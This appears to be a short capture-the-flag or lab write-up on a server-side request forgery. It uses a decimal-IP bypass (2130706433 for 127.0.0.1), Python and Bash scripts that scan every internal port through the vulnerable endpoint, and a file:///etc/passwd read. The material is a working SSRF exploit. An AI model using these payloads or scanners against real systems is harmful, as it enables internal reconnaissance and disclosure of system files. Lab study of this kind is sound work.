bypass using `2130706433` as 127.0.0.1 

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery#bypass-using-a-decimal-ip-location


http://2130706433:3306

![[Pasted image 20210603213939.png]]

```python
#!/bin/python3

import requests 
import re

total = 0

for i in range(65535):
	url = "http://10.10.13.252:8000/attack?url=http://2130706433:{}".format(i)
	res = requests.get(url=url)
	req = re.findall('Target is not reachable', res.text)
	if(req == ['Target is not reachable']):
		pass
	else:
		print("port {} open".format(i))
		total+=1

print("total open ports {}".format(total))
```



```bash
#!/bin/bash

total=0

for i in {1..65535}
do
	#echo "http://10.1.13.252:${i}"
	port_open=$(curl http://10.10.13.252:8000/attack?url=http://2130706433:$i)
	closed='Target is not reachable'
	if grep -q "$closed" <<< "$port_open"
	then
		:
	else
		echo "port open $i"
	fi
done
echo $total
```

after running we got ports 22, 3306, 5000, 6783 & 8000 open

![[Pasted image 20210603231059.png]]

![[Pasted image 20210603231143.png]]

and total user from `file:///etc/passwd`

![[Pasted image 20210603222544.png]]